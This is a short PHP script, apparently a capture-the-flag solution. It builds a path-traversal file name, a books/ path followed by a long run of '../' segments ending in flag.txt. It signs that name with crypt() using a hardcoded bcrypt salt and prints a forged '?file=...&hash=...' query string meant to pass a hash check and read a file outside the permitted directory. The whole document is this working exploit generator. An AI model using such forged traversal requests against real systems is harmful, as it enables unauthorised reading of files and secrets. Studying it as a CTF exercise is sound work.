<?php
$title = 'books/three_hundred_of_the_best_ancient_chinese_profundities_by_sun_tzu/../../../../../../../../../../../flag.txt';
$salt = '$2a$12$iamalibrary12345678901$';

echo "?file=".urlencode($title)."&hash=".crypt($title, $salt);

?>